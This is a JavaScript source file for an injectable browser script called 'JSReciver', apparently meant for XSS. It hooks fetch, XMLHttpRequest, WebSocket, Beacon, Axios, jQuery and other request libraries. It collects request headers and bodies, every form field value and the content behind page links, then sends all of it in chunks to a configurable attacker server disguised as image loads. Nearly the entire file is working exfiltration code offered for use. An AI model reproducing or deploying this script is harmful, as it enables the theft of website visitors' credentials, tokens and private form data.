let STEALER_URI = '';
let MD5 = function(d){var r = M(V(Y(X(d),8*d.length)));return r.toLowerCase()};function M(d){for(var _,m="0123456789ABCDEF",f="",r=0;r<d.length;r++)_=d.charCodeAt(r),f+=m.charAt(_>>>4&15)+m.charAt(15&_);return f}function X(d){for(var _=Array(d.length>>2),m=0;m<_.length;m++)_[m]=0;for(m=0;m<8*d.length;m+=8)_[m>>5]|=(255&d.charCodeAt(m/8))<<m%32;return _}function V(d){for(var _="",m=0;m<32*d.length;m+=8)_+=String.fromCharCode(d[m>>5]>>>m%32&255);return _}function Y(d,_){d[_>>5]|=128<<_%32,d[14+(_+64>>>9<<4)]=_;for(var m=1732584193,f=-271733879,r=-1732584194,i=271733878,n=0;n<d.length;n+=16){var h=m,t=f,g=r,e=i;f=md5_ii(f=md5_ii(f=md5_ii(f=md5_ii(f=md5_hh(f=md5_hh(f=md5_hh(f=md5_hh(f=md5_gg(f=md5_gg(f=md5_gg(f=md5_gg(f=md5_ff(f=md5_ff(f=md5_ff(f=md5_ff(f,r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+0],7,-680876936),f,r,d[n+1],12,-389564586),m,f,d[n+2],17,606105819),i,m,d[n+3],22,-1044525330),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+4],7,-176418897),f,r,d[n+5],12,1200080426),m,f,d[n+6],17,-1473231341),i,m,d[n+7],22,-45705983),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+8],7,1770035416),f,r,d[n+9],12,-1958414417),m,f,d[n+10],17,-42063),i,m,d[n+11],22,-1990404162),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+12],7,1804603682),f,r,d[n+13],12,-40341101),m,f,d[n+14],17,-1502002290),i,m,d[n+15],22,1236535329),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+1],5,-165796510),f,r,d[n+6],9,-1069501632),m,f,d[n+11],14,643717713),i,m,d[n+0],20,-373897302),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+5],5,-701558691),f,r,d[n+10],9,38016083),m,f,d[n+15],14,-660478335),i,m,d[n+4],20,-405537848),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+9],5,568446438),f,r,d[n+14],9,-1019803690),m,f,d[n+3],14,-187363961),i,m,d[n+8],20,1163531501),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+13],5,-1444681467),f,r,d[n+2],9,-51403784),m,f,d[n+7],14,1735328473),i,m,d[n+12],20,-1926607734),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+5],4,-378558),f,r,d[n+8],11,-2022574463),m,f,d[n+11],16,1839030562),i,m,d[n+14],23,-35309556),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+1],4,-1530992060),f,r,d[n+4],11,1272893353),m,f,d[n+7],16,-155497632),i,m,d[n+10],23,-1094730640),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+13],4,681279174),f,r,d[n+0],11,-358537222),m,f,d[n+3],16,-722521979),i,m,d[n+6],23,76029189),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+9],4,-640364487),f,r,d[n+12],11,-421815835),m,f,d[n+15],16,530742520),i,m,d[n+2],23,-995338651),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+0],6,-198630844),f,r,d[n+7],10,1126891415),m,f,d[n+14],15,-1416354905),i,m,d[n+5],21,-57434055),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+12],6,1700485571),f,r,d[n+3],10,-1894986606),m,f,d[n+10],15,-1051523),i,m,d[n+1],21,-2054922799),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+8],6,1873313359),f,r,d[n+15],10,-30611744),m,f,d[n+6],15,-1560198380),i,m,d[n+13],21,1309151649),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+4],6,-145523070),f,r,d[n+11],10,-1120210379),m,f,d[n+2],15,718787259),i,m,d[n+9],21,-343485551),m=safe_add(m,h),f=safe_add(f,t),r=safe_add(r,g),i=safe_add(i,e)}return Array(m,f,r,i)}function md5_cmn(d,_,m,f,r,i){return safe_add(bit_rol(safe_add(safe_add(_,d),safe_add(f,i)),r),m)}function md5_ff(d,_,m,f,r,i,n){return md5_cmn(_&m|~_&f,d,_,r,i,n)}function md5_gg(d,_,m,f,r,i,n){return md5_cmn(_&f|m&~f,d,_,r,i,n)}function md5_hh(d,_,m,f,r,i,n){return md5_cmn(_^m^f,d,_,r,i,n)}function md5_ii(d,_,m,f,r,i,n){return md5_cmn(m^(_|~f),d,_,r,i,n)}function safe_add(d,_){var m=(65535&d)+(65535&_);return(d>>16)+(_>>16)+(m>>16)<<16|65535&m}function bit_rol(d,_){return d<<_|d>>>32-_}


/*
JSReciver v0.0 - @j0moz4 

Edit the var "let STEALER_URI = '';" to your exfiltrationi server URI.

This JavaScript script intercepts various types of HTTP requests made by different libraries and frameworks, such as:

 - Axios
 - Angular HttpClient
 - jQuery Ajax
 - Superagent
 - Request
 - Got
 - Fetch Mock
 - Vue Resource. 
 
It replaces the original functions used for making requests with modified versions that log information about the requests. The intercepted requests are logged by printing their details, such as the request URL, method, headers, and data, to the console. Additionally, the script includes a function called stealInfo that exfiltrates the intercepted request information to a specified URL. It does so by encoding the request data and sending it as a series of images loaded from the exfiltration URL.
The script also intercepts other web-related operations, such as: 

 - WebSocket connections
 - Beacon requests
 - XMLHttpRequests
 - Fetch API requests. 

It logs information about these operations and exfiltrates them in a similar manner as the intercepted HTTP requests. 
Furthermore, the script scans the webpage for elements with src or href attributes and logs and exfiltrates their values. It also collects data from HTML forms present on the page, including form actions, methods, and input field values. The form data is then logged and exfiltrated as well.
Overall, this script acts as a data interception and exfiltration tool, capturing and potentially sending sensitive information from various web requests and webpage elements to a specified exfiltration URL.

Thnx to: https://github.com/hoodoer/XSS-Data-Exfil  
*/

function stealInfo(exfilurl,data){
    var downloadImage = new Image();
    downloadImage.onload = function() {
        image.src = this.src;   
    };

    downloadImage.src = exfilurl+"exfil/" + "DATA" + "/" + data + ".jpg";
    console.log("Done exfiling data..");
}

function makeRequest(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.responseType = "arraybuffer";
  
    xhr.onload = function() {
        if (xhr.status === 200) {
          var response = xhr.response;
          var contentType = xhr.getResponseHeader("Content-Type");
      
          if (contentType.includes("text/html") || contentType.includes("application/json")) {
            // Si la respuesta es HTML o JSON, mostrarla en formato raw
            var result = btoa(String.fromCharCode.apply(null, new Uint8Array(response)));
            console.log("Response (Raw):", String.fromCharCode.apply(null, new Uint8Array(response)));
            callback(result);
          } else if (contentType.includes("image/") || contentType.includes("application/pdf")) {
            // Si la respuesta es una imagen o un PDF, codificarla en base64 y mostrarla
            var result = btoa(String.fromCharCode.apply(null, new Uint8Array(response)));
            console.log("Response (Base64):", result);
            callback(result);
          } else {
            // Verificar otros tipos de contenido
            var result;
            if (contentType.includes("audio/") || contentType.includes("video/") || 
                contentType.includes("application/javascript") || contentType.includes("application/xml") ||
                contentType.includes("application/xhtml+xml") || contentType.includes("application/vnd.ms-excel") ||
                contentType.includes("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet") ||
                contentType.includes("application/vnd.ms-powerpoint") || 
                contentType.includes("application/vnd.openxmlformats-officedocument.presentationml.presentation") ||
                contentType.includes("application/vnd.ms-word") || 
                contentType.includes("application/vnd.openxmlformats-officedocument.wordprocessingml.document") ||
                contentType.includes("application/zip") || contentType.includes("application/x-gzip") ||
                contentType.includes("application/x-tar") || contentType.includes("application/x-bzip2") ||
                contentType.includes("application/x-shockwave-flash") || contentType.includes("application/octet-stream")) {
              // Codificar audio, video, JavaScript, XML, XHTML, hojas de cálculo Excel, presentaciones PowerPoint,
              // documentos de Word, archivos ZIP, GZIP, TAR, BZIP2, archivos SWF de Flash o archivos binarios en base64
              result = btoa(String.fromCharCode.apply(null, new Uint8Array(response)));
              console.log("Response (Base64):", result);
            } else if (contentType.includes("text/plain") || contentType.includes("application/octet-stream")) {
              // Codificar texto plano o archivo binario en base64
              result = btoa(String.fromCharCode.apply(null, new Uint8Array(response)));
              console.log("Response (Base64):", result);
            } else {
              // Tratar otros tipos de contenido según sea necesario
              console.log("Response:", response);
              result = btoa(response);
            }
            callback(result);
          }
        } else {
          console.error("Request failed with status:", xhr.status);
          callback(null);
        }
    };
      
  
    xhr.send();
  }

/*

stealData(uri, exfilurl);

This JavaScript function, stealData, is designed to exfiltrate data from a given URI (Uniform Resource Identifier) using image requests. Here's an explanation of how it works:

The function takes two parameters: uri (the URI from which data will be stolen) and exfilurl (the URL where the exfiltrated data will be sent). Inside the function, a request is made to the specified uri using the makeRequest function. The response data is passed as a parameter to the callback function.
The exfiltration process begins by determining the chunk size for the data to be exfiltrated. In this case, each chunk has a size of 2000 characters. The total number of full chunks (numFullChunks) is calculated by dividing the length of the exfilData by the chunk size. The remaining bits (remainderBits) are calculated as the modulus of the length of exfilData by the chunk size. A loop is then initiated to exfiltrate the data chunk by chunk. The loop runs numFullChunks times.
Inside the loop, an image element (downloadImage) is created. The onload event of this image is set to a function that assigns the source of the image element to the source of the loaded image. The source of the downloadImage is set to a URL constructed using the STEALER_URI, the MD5 hash of the exfilData, the current index of the loop (i), and the current chunk (exfilChunk). This URL is used to request an image from the server.
After the loop, the last remaining chunk is exfiltrated separately, following a similar process as described above.
Finally, a message is logged to the console indicating that the exfiltration of chunks is done.

Please note that this code snippet appears to be attempting to exfiltrate data using images, which could potentially be a security vulnerability or an unauthorized action.

*/

function stealData(uri, exfilurl)
{
            
    makeRequest(uri, function(exfilData) {

			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = STEALER_URI+"exfil/" + MD5(exfilData) + "/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = STEALER_URI+"exfil/"  + MD5(exfilData) + "/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
    });
}

/*

INTERCEPTIONS

This JavaScript functions, interceptar..., is designed to intercept requests made with any Method, a popular HTTP client library. Here's an explanation of how it works:
The function starts by storing the original Method function in a variable called originalMethod. The Method function is then redefined with a new implementation. This new implementation acts as a wrapper around the original Method function. When a request is made using this modified Method function, the wrapper implementation logs information about the request using console.log. The logged information includes the URL, method, headers, and data of the request.
The stealData() or stealInfo() function is then called, passing the STEALER_URI and the request information as parameters. It's unclear which specific function is being used, as there are two commented lines of code:

    stealData(STEALER_URI, config.url);: This line appears to call the stealData function with the STEALER_URI and the URL of the intercepted request.
    stealInfo(STEALER_URI, 'Method Request:' + window.btoa(JSON.stringify({...})));: This line appears to call the stealInfo function with the STEALER_URI and a string representation of the intercepted request information. The request information is first serialized to JSON, then encoded using Base64 with window.btoa.

Finally, the original Method function is invoked using originalMethod.apply(this, arguments), passing along the original arguments that were provided to the modified Method function.

*/


// Interceptar peticiones con Axios
function interceptarAxios() {
    var originalAxios = axios;
    axios = function(config) {
        console.log('Axios Request:', {
            url: config.url,
            method: config.method,
            headers: config.headers,
            data: config.data
        });

        //stealData(STEALER_URI,config.url);
        stealInfo(STEALER_URI,'Superagent Request:'+window.btoa(JSON.stringify({
            url: config.url,
            method: config.method,
            headers: config.headers,
            data: config.data
        })));
        return originalAxios.apply(this, arguments);
    };
}

// Interceptar peticiones con Angular HttpClient
function interceptarAngularHttpClient() {
    var originalRequest = HttpClient.prototype.request;
    HttpClient.prototype.request = function(method, url, options) {
        console.log('Angular HttpClient Request:', {
            url: url,
            method: method,
            headers: options.headers,
            body: options.body
        });

        //stealData(STEALER_URI,url);
        stealInfo(STEALER_URI,'Angular HttpClient Request:'+window.btoa(JSON.stringify({
            url: url,
            method: method,
            headers: options.headers,
            body: options.body
        })));

        return originalRequest.apply(this, arguments);
    };
}

function interceptarjQueryAjax() {
    var originalAjax = jQuery.ajax;
    jQuery.ajax = function(url, options) {
      console.log('jQuery Ajax Request:', {
        url: url,
        method: options.method,
        headers: options.headers,
        data: options.data
      });
  
      // Llamar a la función tercera
      //stealData(STEALER_URI,url);
      // Tu código aquí
      stealInfo(STEALER_URI,' Request:'+window.btoa(JSON.stringify({
            url: url,
            method: options.method,
            headers: options.headers,
            data: options.data
        })));
  
      return originalAjax.apply(this, arguments);
    };
  }

  function interceptarSuperagent() {
    var originalSuperagent = superagent;
    superagent = function(method, url) {
      console.log('Superagent Request:', {
        url: url,
        method: method,
        headers: this._header
      });
  
      // Llamar a la función tercera
      //stealData(STEALER_URI,url);
      // Tu código aquí
      stealInfo(STEALER_URI,' Request:'+window.btoa(JSON.stringify({
            url: url,
            method: method,
            headers: this._header
        })));
  
      return originalSuperagent.apply(this, arguments);
    };
  }

  function interceptarRequest() {
    var originalRequest = request;
    request = function(options) {
      console.log('Request Request:', {
        url: options.url,
        method: options.method,
        headers: options.headers,
        body: options.body
      });
  
      // Llamar a la función tercera
      //stealData(STEALER_URI,url);
      // Tu código aquí
      stealInfo(STEALER_URI,' Request:'+window.btoa(JSON.stringify({
            url: options.url,
            method: options.method,
            headers: options.headers,
            body: options.body
        })));
  
      return originalRequest.apply(this, arguments);
    };
  }

  function interceptarGot() {
    var originalGot = got;
    got = function(url, options) {
      console.log('Got Request:', {
        url: url,
        method: options.method,
        headers: options.headers,
        body: options.body
      });
  
      // Llamar a la función tercera
      //stealData(STEALER_URI,url);
      // Tu código aquí
      stealInfo(STEALER_URI,' Request:'+window.btoa(JSON.stringify({
            url: url,
            method: options.method,
            headers: options.headers,
            body: options.body
        })));
  
      return originalGot.apply(this, arguments);
    };
  }

  function interceptarFetchMock() {
    var originalFetchMock = fetchMock.fetchMock;
    fetchMock.fetchMock = function(url, options) {
      console.log('Fetch-Mock Request:', {
        url: url,
        method: options.method,
        headers: options.headers,
        body: options.body
      });
  
      // Llamar a la función tercera
      //stealData(STEALER_URI,url);
      // Tu código aquí
      stealInfo(STEALER_URI,' Request:'+window.btoa(JSON.stringify({
            url: url,
            method: options.method,
            headers: options.headers,
            body: options.body
        })));
  
      return originalFetchMock.apply(this, arguments);
    };
  }

  function interceptarVueResource() {
    var originalVueHttp = Vue.http;
    Vue.http = function(request) {
      console.log('Vue Resource Request:', {
        url: request.url,
        method: request.method,
        headers: request.headers,
        body: request.body
      });
  
      // Llamar a la función tercera
      //stealData(STEALER_URI,url);
      // Tu código aquí
      stealInfo(STEALER_URI,' Request:'+window.btoa(JSON.stringify({
            url: request.url,
            method: request.method,
            headers: request.headers,
            body: request.body
        })));
  
      return originalVueHttp.apply(this, arguments);
    };
  }

    // En AngularJS, se puede utilizar un interceptor para interceptar las solicitudes HTTP. Aquí tienes un ejemplo de cómo configurar un interceptor en AngularJS para capturar todas las solicitudes HTTP:

    if (window.angular || (window.getAllAngularRootElements && window.ng) || document.querySelector("[ng-app]") || document.querySelector("[data-ng-app]")) {
        console.log("Angular está presente en la página o en el navegador");

        var angularVersion = window.ng.version.full;
        console.log("Versión de Angular en el navegador: " + angularVersion);
          angular.module('myApp', [])
          .config(function($httpProvider) {
          $httpProvider.interceptors.push('myInterceptor');
          })
          .factory('myInterceptor', function() {
            return {
              request: function(config) {
              console.log('AngularJS $http Request:', {
                  url: config.url,
                  method: config.method,
                  headers: config.headers,
                  data: config.data
              });

              // Llamar a la función tercera
              //stealData(STEALER_URI,url);
              // Tu código aquí
              stealInfo(STEALER_URI,' Request:'+window.btoa(JSON.stringify({
                  url: config.url,
                  method: config.method,
                  headers: config.headers,
                  data: config.data
              })));

              return config;
            }
        };
        });
        
    } else {
        console.log("Angular NO está presente en la página ni en el navegador");
    }
      


// Interceptar peticiones con WebSocket
function interceptarWebSocket() {
    var originalWebSocket = WebSocket;
    WebSocket = function(url) {
        console.log('WebSocket Request:', {
            url: url
        });

        //stealData(STEALER_URI,url);
        stealInfo(STEALER_URI,'WebSocket Request:'+window.btoa(JSON.stringify({
            url: url
        })));
        return new originalWebSocket(url);
    };
}

// Interceptar peticiones con Beacon
function interceptarBeacon() {
    var originalBeacon = navigator.sendBeacon;
    navigator.sendBeacon = function(url, data) {
        console.log('Beacon Request:', {
            url: url,
            data: data
        });
        //stealData(STEALER_URI,url);
        stealInfo(STEALER_URI,'Beacon Request:'+window.btoa(JSON.stringify({
            url: url,
            data: data
        })));
        return originalBeacon.apply(this, arguments);
    };
}

// Interceptar peticiones con XMLHttpRequest
function interceptarXMLHttpRequest() {
    var originalXMLHttpRequest = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        var xhr = new originalXMLHttpRequest();

        xhr.open = function(method, url, async, user, password) {
            console.log('XMLHttpRequest Request:', {
                url: url,
                method: method,
                headers: xhr.getAllResponseHeaders(),
                body: xhr.response
            });

            //stealData(STEALER_URI,url);
            stealInfo(STEALER_URI,'XMLHttpRequest Request:'+window.btoa(JSON.stringify({
                url: url,
                method: method,
                headers: xhr.getAllResponseHeaders(),
                body: xhr.response
            })))

            xhr.open = originalXMLHttpRequest.prototype.open;
            xhr.open(method, url, async, user, password);
        };

        return xhr;
    };
}

// Interceptar peticiones con Fetch
function interceptarFetch() {
    var originalFetch = window.fetch;
    window.fetch = function(url, options) {
        console.log('Fetch Request:', {
            url: url,
            method: options.method,
            headers: options.headers,
            body: options.body
        });

        //stealData(STEALER_URI,url);
        stealInfo(STEALER_URI,'Fetch Request:'+window.btoa(JSON.stringify({
            url: url,
            method: options.method,
            headers: options.headers,
            body: options.body
        })))
        return originalFetch.apply(this, arguments);
    };
}

if (typeof axios !== 'undefined') {
    interceptarAxios();
}else{
    console.log("AXIOS not found on this web.")
}

if (typeof window.angular !== 'undefined' && typeof window.angular.httpClient !== 'undefined') {
    interceptarAngularHttpClient();
}else{
    console.log("Angular not found on this web.")
}

if (typeof jQuery !== 'undefined' && typeof jQuery.ajax === 'function') {
    interceptarjQueryAjax();
  }else{
    console.log("jQuery not found on this web.")
  }
  
  if (typeof superagent !== 'undefined') {
    interceptarSuperagent();
  }else{
    console.log("superagent not found on this web.")
  }
  
  if (typeof request !== 'undefined') {
    interceptarRequest();
  }else{
    console.log("request not found on this web.")
  }
  
  if (typeof got !== 'undefined') {
    interceptarGot();
  }else{
    console.log("got not found on this web.")
  }
  
  if (typeof fetchMock !== 'undefined' && typeof fetchMock.fetchMock === 'function') {
    interceptarFetchMock();
  }else{
    console.log("fetchMock not found on this web.")
  }
  
  if (typeof Vue !== 'undefined' && typeof Vue.http === 'function') {
    interceptarVueResource();
  }else{
    console.log("Vue not found on this web.")
  }
  

interceptarWebSocket();
interceptarBeacon();
interceptarXMLHttpRequest();
interceptarFetch();


window.addEventListener('load', function() {
    var elementsWithSrc = document.querySelectorAll('[src], [href]');

    elementsWithSrc.forEach(function(element) {
        var srcValue = element.getAttribute('src');
        var hrefValue = element.getAttribute('href');

        if (srcValue && srcValue !== undefined && srcValue !== null) {
            console.log('src: ' + srcValue);
            stealData(srcValue, STEALER_URI);
        }

        if (hrefValue && hrefValue !== undefined && hrefValue !== null) {
            console.log('href: ' + hrefValue);
            stealData(hrefValue, STEALER_URI);

        }
    });

    var formularios = document.getElementsByTagName('form');
    var form_data = [];

    for (var i = 0; i < formularios.length; i++) {
        var formulario = formularios[i];
    
        var action = formulario.getAttribute('action');
        var method = formulario.getAttribute('method') || 'GET';
    
        var formulario_data = {
            id: i,
            action: action,
            method: method,
            elementos: []
        };
    
        var elementos = formulario.elements;
    
        for (var j = 0; j < elementos.length; j++) {
            var elemento = elementos[j];
            var tipo = elemento.type;
            var valor = elemento.value;
            var esOculto = (tipo === 'hidden');
    
            var elemento_data = {
                tipo: tipo,
                valor: valor,
                esOculto: esOculto
            };
    
            formulario_data.elementos.push(elemento_data);
        }
    
        form_data.push(formulario_data);
    }
    console.log(window.btoa(JSON.stringify(form_data)));
    stealInfo(STEALER_URI,"Forms data:"+window.btoa(JSON.stringify(form_data)))

});
